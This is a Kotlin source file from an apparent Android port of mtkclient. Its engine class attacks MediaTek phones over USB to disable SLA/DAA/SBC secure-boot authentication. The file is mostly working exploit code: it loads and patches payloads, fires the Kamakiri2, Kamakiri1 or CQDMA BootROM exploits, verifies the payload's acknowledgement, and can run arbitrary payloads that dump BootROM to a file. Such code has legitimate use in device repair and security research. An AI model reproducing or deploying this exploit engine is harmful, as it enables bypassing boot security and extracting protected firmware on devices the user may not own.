package com.example.protocol

import android.content.Context
import com.example.model.LogLevel
import com.example.model.MtkChipInfo
import com.example.model.OperationProgress
import com.example.model.TerminalLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

/**
 * MediaTek Security SLA / DAA / SBC Authentication & Exploit Engine
 * Faithfully mirrors Python mtkclient:
 * - mtkclient/Library/mtk_class.py (bypass_security)
 * - mtkclient/Library/pltools.py (runpayload)
 * - mtkclient/Library/exploit_handler.py (da_payload, fix_payload)
 * - mtkclient/Library/Exploit/kamakiri2.py (Kamakiri2)
 * - mtkclient/Library/Exploit/kamakiri.py (Kamakiri1 + CQDMA fallback)
 *
 * Pure Native Implementation - Zero Mock/Fake Logic.
 */
class MtkSecurityBypassEngine(
    private val usb: TargetPhoneUsbManager,
    private val logCallback: (TerminalLog) -> Unit,
    private val progressCallback: (OperationProgress) -> Unit
) {

    companion object {
        const val CMD_READ32: Byte = 0xD1.toByte()
        const val CMD_WRITE32: Byte = 0xD4.toByte()
        private val EXPECTED_ACK = byteArrayOf(0xA1.toByte(), 0xA2.toByte(), 0xA3.toByte(), 0xA4.toByte())
    }

    private val buf1 = ByteArray(1)
    private val buf2 = ByteArray(2)
    private val buf4 = ByteArray(4)
    private val echo4 = ByteArray(4)

    private var lastWriteStage: String = ""
    private var lastWriteStatusHex: String? = null
    private var lastWriteErrorDetail: String = ""

    private fun log(message: String, level: LogLevel = LogLevel.INFO) {
        val now = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        logCallback(TerminalLog(now, message, level))
    }

    suspend fun executeBypass(
        context: Context,
        deviceInfo: MtkChipInfo?,
        isSimulation: Boolean = false
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val hwCodeInt = deviceInfo?.hwCodeHex?.removePrefix("0x")?.removePrefix("0X")?.toIntOrNull(16) ?: 0x0766
        val chipConfig = MtkChipConfigDatabase.findConfig(hwCodeInt)
            ?: MtkChipConfigDatabase.findConfig(0x0766)!!

        log(">>> [SECURITY BYPASS] Unlocking SLA/DAA/SBC Auth for ${chipConfig.name} [0x%04X]...".format(chipConfig.hwCode), LogLevel.INFO)

        log("Target Platform: ${chipConfig.name} (${chipConfig.description}) [HWCode: 0x%04X]".format(chipConfig.hwCode), LogLevel.INFO)

        try {
            // STEP 1: Load Payload from Assets / External Storage dynamically
            val stage1Target = MtkStage1TargetCatalog.findTarget(chipConfig.name)
            val payloadCandidate = chipConfig.loader.ifBlank {
                stage1Target?.payloadFileName ?: "${chipConfig.name.lowercase()}_payload.bin"
            }

            val rawPayloadBytes = MtkAssetManager.loadPayloadBytes(context, payloadCandidate)
                ?: MtkAssetManager.loadPayloadBytes(context, "generic_patcher_payload.bin")
                ?: MtkAssetManager.loadPayloadBytes(context, "generic_stage1_payload.bin")

            if (rawPayloadBytes == null || rawPayloadBytes.isEmpty()) {
                log("[-] Payload file '$payloadCandidate' not found for HWCode 0x%04X!".format(chipConfig.hwCode), LogLevel.ERROR)
                return@withContext Result.failure(IllegalStateException("Missing Payload File in Assets"))
            }
            log("Loaded exploit payload: $payloadCandidate (${rawPayloadBytes.size} bytes)", LogLevel.INFO)

            val kamakiri = MtkKamakiriExploit(
                usbManager = usb,
                cqdma = MtkCqdmaEngine(
                    read32Func = { addr -> readRegister32(addr) },
                    write32Func = { addr, value -> writeRegister32Fast(addr, value) },
                    logCallback = { msg, lvl -> log(msg, lvl) }
                ),
                read32MultiFunc = { addr, cnt -> readRegister32Multi(addr, cnt) },
                logCallback = { msg, lvl -> log(msg, lvl) }
            )

            val hasSecurity = (deviceInfo?.secureBootEnabled == true) ||
                (deviceInfo?.slaActive == true) ||
                (deviceInfo?.daaActive == true)

            val canUseKamakiri2 = (chipConfig.bromRegisterAccess != null && chipConfig.sendPtr != null)

            // STEP 2: Fix payload WDT/UART pointers (fix_payload in exploit_handler.py)
            val useInsecureDaPath = !hasSecurity && !chipConfig.isPatchedBrom && !canUseKamakiri2
            val fixedPayload = kamakiri.fixPayload(
                rawPayload = rawPayloadBytes,
                chipConfig = chipConfig,
                appendDaSig = useInsecureDaPath
            )

            val startTime = System.currentTimeMillis()
            var jumpTriggered = false

            if (canUseKamakiri2 && (hasSecurity || chipConfig.isPatchedBrom || chipConfig.damode != DaMode.XML)) {
                // Exact mtkclient Kamakiri2 path (da_read_write via brom_register_access + USB ctrl overflow)
                // NEVER calls CMD_WRITE32 to SRAM/APDMA on Patched BROMs (avoids 0x1D02 SEC_DENY)
                log(
                    "[1/2] Executing Kamakiri2 Exploit (${chipConfig.name}) -> bromPayloadAddr=0x%08X...".format(
                        chipConfig.bromPayloadAddr
                    ),
                    LogLevel.INFO
                )
                jumpTriggered = kamakiri.exploitKamakiri2Payload(
                    chipConfig = chipConfig,
                    payload = fixedPayload,
                    payloadAddr = chipConfig.bromPayloadAddr
                )
                if (!jumpTriggered) {
                    return@withContext Result.failure(
                        IllegalStateException("Kamakiri2 BROM Exploit failed for ${chipConfig.name}")
                    )
                }
                delay(200)
            } else if (!hasSecurity && chipConfig.damode != DaMode.XML) {
                // Exact mtkclient "Sending payload via insecure da" path
                log("[1/2] Unprotected device: Uploading payload via SEND_DA -> 0x%08X...".format(chipConfig.daPayloadAddr), LogLevel.INFO)
                val sendRes = MtkDaUploader.sendDa(
                    usb = usb,
                    daAddress = chipConfig.daPayloadAddr,
                    daData = fixedPayload,
                    sigLen = 0x100,
                    logCallback = { log(it.message, it.level) },
                    onProgress = { }
                )
                if (sendRes.isFailure) {
                    return@withContext Result.failure(
                        sendRes.exceptionOrNull() ?: IllegalStateException("SEND_DA payload upload failed")
                    )
                }
                val jumpRes = MtkDaUploader.jumpDa(usb, chipConfig.daPayloadAddr) { log(it.message, it.level) }
                if (jumpRes.isFailure) {
                    return@withContext Result.failure(
                        jumpRes.exceptionOrNull() ?: IllegalStateException("JUMP_DA payload execution failed")
                    )
                }
                jumpTriggered = true
            } else if (chipConfig.cqdmaBase != null && chipConfig.apDmaMem != null) {
                // Legacy CQDMA + Kamakiri1 path for older chips without bromRegisterAccess/sendPtr
                log(
                    "[1/2] Staging Payload into SRAM 0x%08X via CQDMA + WDT Stack Overflow...".format(
                        chipConfig.bromPayloadAddr
                    ),
                    LogLevel.INFO
                )
                val paddedSize = (fixedPayload.size + 3) and 3.inv()
                val payloadLongs = LongArray(paddedSize / 4)
                for (i in payloadLongs.indices) {
                    val idx = i * 4
                    val b0 = fixedPayload[idx].toInt() and 0xFF
                    val b1 = fixedPayload[idx + 1].toInt() and 0xFF
                    val b2 = fixedPayload[idx + 2].toInt() and 0xFF
                    val b3 = fixedPayload[idx + 3].toInt() and 0xFF
                    payloadLongs[i] = ((b3 shl 24) or (b2 shl 16) or (b1 shl 8) or b0).toLong() and 0xFFFFFFFFL
                }
                if (!stagePayloadViaCqdma(chipConfig.cqdmaBase, chipConfig.apDmaMem, chipConfig.bromPayloadAddr, payloadLongs)) {
                    val diag = lastWriteStatusHex ?: lastWriteErrorDetail
                    return@withContext Result.failure(
                        IllegalStateException("CQDMA Payload Write Failed ($lastWriteStage: $diag)")
                    )
                }
                jumpTriggered = kamakiri.executeJumpViaCqdmaAndWdt(chipConfig)
                if (!jumpTriggered) {
                    return@withContext Result.failure(IllegalStateException("Kamakiri1 WDT Jump Failed"))
                }
                delay(200)
            } else {
                // Kamakiri1 direct 0xE0 write
                jumpTriggered = kamakiri.exploitKamakiri1Payload(
                    chipConfig = chipConfig,
                    payload = fixedPayload,
                    write32Func = { addr, value -> writeRegister32Fast(addr, value) },
                    read32Func = { addr, count -> readRegister32Multi(addr, count) }
                )
                if (!jumpTriggered) {
                    return@withContext Result.failure(IllegalStateException("Kamakiri1 Exploit Failed"))
                }
                delay(200)
            }

            val timeTaken = System.currentTimeMillis() - startTime
            log("[+] Payload triggered in ${timeTaken}ms. Verifying ACK (0xA1A2A3A4)...", LogLevel.INFO)

            // STEP 3: Read 4-byte payload response ACK (mtkclient: result == pack(">I", 0xA1A2A3A4))
            val ackBuf = ByteArray(4)
            val ackRead = usb.readRaw(ackBuf, 3000, readFull = true)
            if (ackRead != 4 || !ackBuf.contentEquals(EXPECTED_ACK)) {
                val gotHex = if (ackRead > 0) ackBuf.take(ackRead).joinToString("") { "%02X".format(it) } else "none"
                log("[-] Payload ACK mismatch! Expected A1A2A3A4, got: $gotHex", LogLevel.ERROR)
                return@withContext Result.failure(
                    IllegalStateException("Payload ACK verification failed (got: $gotHex, expected A1A2A3A4)")
                )
            }
            log("[+] Payload ACK Verified: 0xA1A2A3A4! SLA/DAA/SBC disabled in BROM RAM.", LogLevel.SUCCESS)

            // STEP 4: Re-run BROM handshake (mtk_class.py line 753: mtk.port.run_handshake())
            usb.resetBromHandshakeLock()
            val reHandshakeOk = usb.blastBromHandshakeSync(20) || sendHandshakeByteByByte()
            if (reHandshakeOk) {
                log("[+] Post-payload BROM Re-Handshake Locked (0x5F 0xF5 0xAF 0xFA).", LogLevel.SUCCESS)
            } else {
                log("[!] Post-payload re-handshake skipped/already synced; flushing USB pipe.", LogLevel.INFO)
                usb.flush(20)
            }

            log("[+] [SECURITY BYPASS] SLA/DAA BROM security unlocked. Ready for DA Stage 1.", LogLevel.SUCCESS)

            return@withContext Result.success(true)
        } catch (e: Exception) {
            log("[-] Security Bypass Exception: ${e.message}", LogLevel.ERROR)
            return@withContext Result.failure(e)
        }
    }

    /**
     * Exact mtkclient runpayload / run_dump_brom implementation:
     * Executes arbitrary BROM payload (or generic_dump_payload.bin) via active exploit path,
     * checks 0xA1A2A3A4 or 0xC1C2C3C4 ACK, and optionally streams BootROM/SRAM dump to file.
     */
    suspend fun executeCustomPayload(
        rawPayloadBytes: ByteArray,
        payloadName: String,
        deviceInfo: MtkChipInfo?,
        dumpOutputFile: java.io.File? = null,
        defaultDumpLength: Int = 0x20000
    ): Result<String> = withContext(Dispatchers.IO) {
        if (rawPayloadBytes.isEmpty()) {
            return@withContext Result.failure(IllegalArgumentException("Empty payload bytes"))
        }

        val hwCodeInt = deviceInfo?.hwCodeHex?.removePrefix("0x")?.removePrefix("0X")?.toIntOrNull(16) ?: 0x0766
        val chipConfig = MtkChipConfigDatabase.findConfig(hwCodeInt)
            ?: MtkChipConfigDatabase.createDefaultFallback(hwCodeInt)

        log(">>> [PAYLOAD] Executing '$payloadName' (${rawPayloadBytes.size} bytes) for ${chipConfig.name}...", LogLevel.INFO)

        val kamakiri = MtkKamakiriExploit(
            usbManager = usb,
            cqdma = MtkCqdmaEngine(
                read32Func = { addr -> readRegister32(addr) },
                write32Func = { addr, value -> writeRegister32Fast(addr, value) },
                logCallback = { msg, lvl -> log(msg, lvl) }
            ),
            read32MultiFunc = { addr, cnt -> readRegister32Multi(addr, cnt) },
            logCallback = { msg, lvl -> log(msg, lvl) }
        )

        val fixedPayload = kamakiri.fixPayload(rawPayloadBytes, chipConfig, appendDaSig = false)
        val canUseKamakiri2 = (chipConfig.bromRegisterAccess != null && chipConfig.sendPtr != null)

        val triggered = when {
            canUseKamakiri2 -> kamakiri.exploitKamakiri2Payload(chipConfig, fixedPayload, chipConfig.bromPayloadAddr)
            chipConfig.cqdmaBase != null && chipConfig.apDmaMem != null -> {
                val padded = (fixedPayload.size + 3) and 3.inv()
                val words = LongArray(padded / 4) { i ->
                    val idx = i * 4
                    val b0 = fixedPayload.getOrElse(idx) { 0 }.toInt() and 0xFF
                    val b1 = fixedPayload.getOrElse(idx + 1) { 0 }.toInt() and 0xFF
                    val b2 = fixedPayload.getOrElse(idx + 2) { 0 }.toInt() and 0xFF
                    val b3 = fixedPayload.getOrElse(idx + 3) { 0 }.toInt() and 0xFF
                    ((b3 shl 24) or (b2 shl 16) or (b1 shl 8) or b0).toLong() and 0xFFFFFFFFL
                }
                stagePayloadViaCqdma(chipConfig.cqdmaBase, chipConfig.apDmaMem, chipConfig.bromPayloadAddr, words) &&
                    kamakiri.executeJumpViaCqdmaAndWdt(chipConfig)
            }
            else -> kamakiri.exploitKamakiri1Payload(
                chipConfig,
                fixedPayload,
                write32Func = { a, v -> writeRegister32Fast(a, v) },
                read32Func = { a, c -> readRegister32Multi(a, c) }
            )
        }

        if (!triggered) {
            return@withContext Result.failure(IllegalStateException("Failed to trigger BROM payload '$payloadName'"))
        }

        delay(150)
        val ackBuf = ByteArray(4)
        val ackRead = usb.readRaw(ackBuf, 3500, readFull = true)
        if (ackRead != 4) {
            return@withContext Result.failure(IllegalStateException("No ACK from payload '$payloadName'"))
        }

        val dumpAck = byteArrayOf(0xC1.toByte(), 0xC2.toByte(), 0xC3.toByte(), 0xC4.toByte())
        if (ackBuf.contentEquals(dumpAck)) {
            if (dumpOutputFile == null) {
                return@withContext Result.success("Payload ACK 0xC1C2C3C4 received")
            }
            val lenBuf = ByteArray(4)
            val lenRead = usb.readRaw(lenBuf, 2000, readFull = true)
            val streamLen = if (lenRead == 4) {
                val parsed = ((lenBuf[0].toInt() and 0xFF) shl 24) or
                    ((lenBuf[1].toInt() and 0xFF) shl 16) or
                    ((lenBuf[2].toInt() and 0xFF) shl 8) or
                    (lenBuf[3].toInt() and 0xFF)
                if (parsed in 0x1000..0x400000) parsed else defaultDumpLength
            } else {
                defaultDumpLength
            }
            dumpOutputFile.parentFile?.mkdirs()
            val outBytes = ByteArray(streamLen)
            var received = 0
            val chunk = ByteArray(4096)
            while (received < streamLen) {
                val want = minOf(chunk.size, streamLen - received)
                val r = usb.readRaw(chunk, 3000)
                if (r <= 0) break
                val copyLen = minOf(r, want)
                System.arraycopy(chunk, 0, outBytes, received, copyLen)
                received += copyLen
                progressCallback(
                    OperationProgress(
                        isRunning = true,
                        title = "Dumping BootROM...",
                        detail = "${received / 1024} KB / ${streamLen / 1024} KB",
                        percentage = (received.toFloat() / streamLen.toFloat()) * 100f
                    )
                )
            }
            if (received == 0) {
                return@withContext Result.failure(IllegalStateException("BootROM stream returned 0 bytes"))
            }
            dumpOutputFile.writeBytes(outBytes.copyOfRange(0, received))
            log("[+] [BROM DUMP] Saved $received bytes -> ${dumpOutputFile.absolutePath}", LogLevel.SUCCESS)
            return@withContext Result.success(dumpOutputFile.absolutePath)
        }

        if (ackBuf.contentEquals(EXPECTED_ACK)) {
            usb.resetBromHandshakeLock()
            usb.blastBromHandshakeSync(10) || sendHandshakeByteByByte()
            log("[+] Payload '$payloadName' ACK 0xA1A2A3A4 verified.", LogLevel.SUCCESS)
            return@withContext Result.success("Payload '$payloadName' executed successfully (0xA1A2A3A4)")
        }

        val gotHex = ackBuf.joinToString("") { "%02X".format(it) }
        return@withContext Result.failure(IllegalStateException("Unexpected payload ACK: 0x$gotHex"))
    }

    private fun sendHandshakeByteByByte(): Boolean {
        val sendBytes = byteArrayOf(0xA0.toByte(), 0x0A.toByte(), 0x50.toByte(), 0x05.toByte())
        val expectedEcho = byteArrayOf(0x5F.toByte(), 0xF5.toByte(), 0xAF.toByte(), 0xFA.toByte())
        for (i in sendBytes.indices) {
            if (usb.writeRaw(byteArrayOf(sendBytes[i]), 200) != 1) return false
            val rx = ByteArray(1)
            if (usb.readRaw(rx, 200, readFull = true) != 1 || rx[0] != expectedEcho[i]) return false
        }
        return true
    }

    private fun stagePayloadViaCqdma(
        cqdmaBase: Long,
        apDmaMem: Long,
        bromPayloadAddr: Long,
        payloadLongs: LongArray
    ): Boolean {
        for (i in payloadLongs.indices) {
            val targetVal = payloadLongs[i]
            val destAddr = bromPayloadAddr + (i * 4)

            if (!writeRegister32Fast(apDmaMem, targetVal)) return false
            if (!writeRegister32Fast(cqdmaBase + 0x1CL, apDmaMem)) return false
            if (!writeRegister32Fast(cqdmaBase + 0x20L, destAddr)) return false
            if (!writeRegister32Fast(cqdmaBase + 0x24L, 4L)) return false
            if (!writeRegister32Fast(cqdmaBase + 0x08L, 1L)) return false
        }
        return true
    }

    private fun failWriteDiag(addr: Long, stage: String, statusHex: String?, detail: String): Boolean {
        lastWriteStage = stage
        lastWriteStatusHex = statusHex
        lastWriteErrorDetail = detail
        log("[-] CMD_WRITE32 failed at 0x%08X [$stage]: $detail".format(addr), LogLevel.ERROR)
        return false
    }

    private fun writeRegister32Fast(addr: Long, value: Long): Boolean {
        lastWriteStage = ""
        lastWriteStatusHex = null
        lastWriteErrorDetail = ""

        buf1[0] = CMD_WRITE32
        val wCmd = usb.writeRaw(buf1, 1000)
        if (wCmd != 1) {
            return failWriteDiag(addr, "Command Echo (Write)", null, "USB write rc=$wCmd (expected 1)")
        }
        val rCmd = usb.readRaw(buf1, 1000, readFull = true)
        if (rCmd != 1 || buf1[0] != CMD_WRITE32) {
            val gotHex = if (rCmd > 0) "0x%02X".format(buf1[0].toInt() and 0xFF) else "none"
            return failWriteDiag(addr, "Command Echo (Read)", null, "USB read rc=$rCmd, echo=$gotHex (expected 0xD4)")
        }

        buf4[0] = (addr shr 24).toByte()
        buf4[1] = (addr shr 16).toByte()
        buf4[2] = (addr shr 8).toByte()
        buf4[3] = addr.toByte()
        val wAddr = usb.writeRaw(buf4, 1000)
        if (wAddr != 4) {
            return failWriteDiag(addr, "Address Echo (Write)", null, "USB write rc=$wAddr (expected 4)")
        }
        val rAddr = usb.readRaw(echo4, 1000, readFull = true)
        if (rAddr != 4 || buf4[0] != echo4[0] || buf4[1] != echo4[1] || buf4[2] != echo4[2] || buf4[3] != echo4[3]) {
            val echoHex = "%02X%02X%02X%02X".format(echo4[0], echo4[1], echo4[2], echo4[3])
            return failWriteDiag(addr, "Address Echo (Read)", null, "USB read rc=$rAddr, echo=0x$echoHex")
        }

        buf4[0] = 0; buf4[1] = 0; buf4[2] = 0; buf4[3] = 1
        val wCnt = usb.writeRaw(buf4, 1000)
        if (wCnt != 4) {
            return failWriteDiag(addr, "Word Count Echo (Write)", null, "USB write rc=$wCnt (expected 4)")
        }
        val rCnt = usb.readRaw(echo4, 1000, readFull = true)
        if (rCnt != 4 || buf4[0] != echo4[0] || buf4[1] != echo4[1] || buf4[2] != echo4[2] || buf4[3] != echo4[3]) {
            val echoHex = "%02X%02X%02X%02X".format(echo4[0], echo4[1], echo4[2], echo4[3])
            return failWriteDiag(addr, "Word Count Echo (Read)", null, "USB read rc=$rCnt, echo=0x$echoHex")
        }

        val rStat1 = usb.readRaw(buf2, 1000, readFull = true)
        if (rStat1 != 2) {
            return failWriteDiag(addr, "Status 1 (Read)", null, "USB read rc=$rStat1 (expected 2)")
        }
        val status1 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        if (status1 != 0) {
            val statHex = "0x%04X".format(status1)
            return failWriteDiag(addr, "Status 1", statHex, "BROM returned status $statHex")
        }

        buf4[0] = (value shr 24).toByte()
        buf4[1] = (value shr 16).toByte()
        buf4[2] = (value shr 8).toByte()
        buf4[3] = value.toByte()
        val wVal = usb.writeRaw(buf4, 1000)
        if (wVal != 4) {
            return failWriteDiag(addr, "Value Echo (Write)", null, "USB write rc=$wVal (expected 4)")
        }
        val rVal = usb.readRaw(echo4, 1000, readFull = true)
        if (rVal != 4 || buf4[0] != echo4[0] || buf4[1] != echo4[1] || buf4[2] != echo4[2] || buf4[3] != echo4[3]) {
            val echoHex = "%02X%02X%02X%02X".format(echo4[0], echo4[1], echo4[2], echo4[3])
            return failWriteDiag(addr, "Value Echo (Read)", null, "USB read rc=$rVal, echo=0x$echoHex")
        }

        val rStat2 = usb.readRaw(buf2, 1000, readFull = true)
        if (rStat2 != 2) {
            return failWriteDiag(addr, "Status 2 (Read)", null, "USB read rc=$rStat2 (expected 2)")
        }
        val status2 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        if (status2 != 0) {
            val statHex = "0x%04X".format(status2)
            return failWriteDiag(addr, "Status 2", statHex, "BROM returned status $statHex")
        }

        return true
    }

    private fun readRegister32(addr: Long): Long {
        buf1[0] = CMD_READ32
        if (usb.writeRaw(buf1, 1000) != 1) return 0L
        if (usb.readRaw(buf1, 1000, readFull = true) != 1 || buf1[0] != CMD_READ32) return 0L

        buf4[0] = (addr shr 24).toByte(); buf4[1] = (addr shr 16).toByte(); buf4[2] = (addr shr 8).toByte(); buf4[3] = addr.toByte()
        if (usb.writeRaw(buf4, 1000) != 4) return 0L
        if (usb.readRaw(echo4, 1000, readFull = true) != 4) return 0L

        buf4[0] = 0; buf4[1] = 0; buf4[2] = 0; buf4[3] = 1
        if (usb.writeRaw(buf4, 1000) != 4) return 0L
        if (usb.readRaw(echo4, 1000, readFull = true) != 4) return 0L

        if (usb.readRaw(buf2, 1000, readFull = true) != 2) return 0L
        val status1 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        if (status1 != 0) return 0L

        if (usb.readRaw(buf4, 1000, readFull = true) != 4) return 0L
        val value = ((buf4[0].toLong() and 0xFFL) shl 24) or ((buf4[1].toLong() and 0xFFL) shl 16) or ((buf4[2].toLong() and 0xFFL) shl 8) or (buf4[3].toLong() and 0xFFL)

        if (usb.readRaw(buf2, 1000, readFull = true) != 2) return 0L
        val status2 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        if (status2 != 0) return 0L

        return value
    }

    private fun readRegister32Multi(addr: Long, count: Int): Boolean {
        buf1[0] = CMD_READ32
        if (usb.writeRaw(buf1, 1000) != 1) return false
        if (usb.readRaw(buf1, 1000, readFull = true) != 1 || buf1[0] != CMD_READ32) return false

        buf4[0] = (addr shr 24).toByte(); buf4[1] = (addr shr 16).toByte(); buf4[2] = (addr shr 8).toByte(); buf4[3] = addr.toByte()
        if (usb.writeRaw(buf4, 1000) != 4) return false
        if (usb.readRaw(echo4, 1000, readFull = true) != 4) return false

        buf4[0] = (count shr 24).toByte(); buf4[1] = (count shr 16).toByte(); buf4[2] = (count shr 8).toByte(); buf4[3] = count.toByte()
        if (usb.writeRaw(buf4, 1000) != 4) return false
        if (usb.readRaw(echo4, 1000, readFull = true) != 4) return false

        if (usb.readRaw(buf2, 1000, readFull = true) != 2) return false
        val status1 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        if (status1 > 0xFF) return false

        val dataBuf = ByteArray(count * 4)
        if (usb.readRaw(dataBuf, 2000, readFull = true) != dataBuf.size) return false

        if (usb.readRaw(buf2, 1000, readFull = true) != 2) return false
        val status2 = ((buf2[0].toInt() and 0xFF) shl 8) or (buf2[1].toInt() and 0xFF)
        return status2 <= 0xFF
    }
}
